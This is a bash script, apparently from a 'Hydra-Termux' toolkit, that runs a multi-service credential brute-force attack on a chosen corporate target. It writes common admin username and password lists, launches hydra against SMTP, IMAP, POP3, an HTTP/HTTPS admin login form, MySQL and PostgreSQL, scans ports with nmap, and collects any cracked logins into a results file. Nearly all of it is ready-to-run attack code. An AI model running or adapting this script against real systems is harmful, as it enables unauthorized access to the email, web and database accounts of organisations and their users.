#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# 🚀 SUPREME COMBO: EMAIL + WEB + DATABASE STACK
# Complete corporate infrastructure attack
# Tests: Email (SMTP/IMAP/POP3) + Web (HTTP/HTTPS) + Database (MySQL/PostgreSQL)
# ═══════════════════════════════════════════════════════════════════

# ════════════════════════════════════════════════════════════════
# ⚡ CONFIGURATION - Replace with actual target ⚡
# ════════════════════════════════════════════════════════════════
TARGET="corporate.example.com"         # Main target domain/IP - REPLACE THIS
EMAIL="admin@corporate.example.com"    # Test email account - REPLACE THIS
WEB_PATH="/admin"                      # Web admin path
# ════════════════════════════════════════════════════════════════

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/combo_supreme_email_web_db_${TARGET//[.:\/]/_}_${TIMESTAMP}.log"
RESULTS_FILE="$OUTPUT_DIR/combo_supreme_email_web_db_${TARGET//[.:\/]/_}_${TIMESTAMP}_results.txt"

# Color codes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  🚀 SUPREME COMBO: EMAIL + WEB + DATABASE STACK${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Target:${NC}       ${BOLD}$TARGET${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Email:${NC}        ${BOLD}$EMAIL${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Web Path:${NC}     ${BOLD}$WEB_PATH${NC}" | tee -a "$LOG_FILE"
echo -e "${GREEN}  Started:${NC}      $(date)" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERNAME="${EMAIL%%@*}"
USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

# Create lists if not exist
if [ ! -f "$USERLIST" ]; then
    cat > "$USERLIST" << EOF
admin
administrator
$USERNAME
root
webmaster
postmaster
dbadmin
sysadmin
EOF
fi

if [ ! -f "$PASSLIST" ]; then
    cat > "$PASSLIST" << EOF

password
123456
admin
Password123
admin123
$USERNAME
letmein
welcome
changeme
P@ssw0rd
EOF
fi

FOUND_CREDS=()

# ═══════════════════════════════════════════════════════════════════
# PHASE 1: EMAIL INFRASTRUCTURE ATTACK
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 1: Email Infrastructure (SMTP/IMAP/POP3) ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# SMTP
echo -e "${BLUE}[1.1]${NC} Testing SMTP (Port 25/587)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 12 -w 30 -f "smtp://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ SMTP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("SMTP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# IMAP
echo -e "${BLUE}[1.2]${NC} Testing IMAP (Port 143/993)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "imap://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ IMAP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("IMAP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# POP3
echo -e "${BLUE}[1.3]${NC} Testing POP3 (Port 110/995)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -w 20 -f "pop3://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ POP3 Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("POP3")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 2: WEB APPLICATION ATTACK
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 2: Web Application (HTTP/HTTPS) ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# HTTP
echo -e "${BLUE}[2.1]${NC} Testing HTTP Admin Panel (Port 80)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "http-post-form://$TARGET$WEB_PATH/login.php:username=^USER^&password=^PASS^:F=incorrect" \
        2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ HTTP Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("HTTP")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# HTTPS
echo -e "${BLUE}[2.2]${NC} Testing HTTPS Admin Panel (Port 443)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 16 -f \
        "https-post-form://$TARGET$WEB_PATH/login.php:username=^USER^&password=^PASS^:F=incorrect" \
        2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ HTTPS Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("HTTPS")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 3: DATABASE ATTACK
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 3: Database Servers (MySQL/PostgreSQL) ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# MySQL
echo -e "${BLUE}[3.1]${NC} Testing MySQL (Port 3306)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 24 -w 20 -f "mysql://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ MySQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("MySQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# PostgreSQL
echo -e "${BLUE}[3.2]${NC} Testing PostgreSQL (Port 5432)..." | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 20 -w 25 -f "postgres://$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    if grep -q "login:" "$LOG_FILE" 2>/dev/null; then
        echo -e "   ${GREEN}✓ PostgreSQL Credentials Found!${NC}" | tee -a "$RESULTS_FILE"
        FOUND_CREDS+=("PostgreSQL")
    fi
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# PHASE 4: PORT SCANNING & SERVICE DETECTION
# ═══════════════════════════════════════════════════════════════════
echo -e "${PURPLE}━━━ Phase 4: Comprehensive Port Scan ━━━${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

if command -v nmap &>/dev/null; then
    echo -e "${BLUE}[4.1]${NC} Scanning all discovered services..." | tee -a "$LOG_FILE"
    nmap -Pn -sV -p 25,80,110,143,443,465,587,993,995,3306,5432,8080,8443 -T4 "$TARGET" 2>&1 | tee -a "$LOG_FILE"
fi
echo "" | tee -a "$LOG_FILE"

# ═══════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${WHITE}  ✅ SUPREME COMBO ATTACK COMPLETE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Display found credentials
if [ ${#FOUND_CREDS[@]} -gt 0 ]; then
    echo -e "${GREEN}🎉 CREDENTIALS DISCOVERED:${NC}" | tee -a "$RESULTS_FILE"
    for service in "${FOUND_CREDS[@]}"; do
        echo -e "   ${GREEN}✓${NC} $service" | tee -a "$RESULTS_FILE"
    done
    echo "" | tee -a "$RESULTS_FILE"
    
    # Extract actual credentials
    grep -E "login:|password:|host:" "$LOG_FILE" | tee -a "$RESULTS_FILE"
else
    echo -e "${YELLOW}ℹ No credentials found. Try larger wordlists.${NC}" | tee -a "$RESULTS_FILE"
fi

echo "" | tee -a "$LOG_FILE"
echo -e "${BLUE}📊 Attack Summary:${NC}" | tee -a "$LOG_FILE"
echo -e "   Services Tested: Email (3), Web (2), Database (2)" | tee -a "$LOG_FILE"
echo -e "   Total Services: 7" | tee -a "$LOG_FILE"
echo -e "   Successful: ${#FOUND_CREDS[@]}" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${BLUE}📁 Output Files:${NC}" | tee -a "$LOG_FILE"
echo -e "   Log: $LOG_FILE" | tee -a "$LOG_FILE"
echo -e "   Results: $RESULTS_FILE" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
echo -e "${PURPLE}⚡ SUPREME COMBO POWERED BY HYDRA-TERMUX ULTIMATE${NC}" | tee -a "$LOG_FILE"
echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
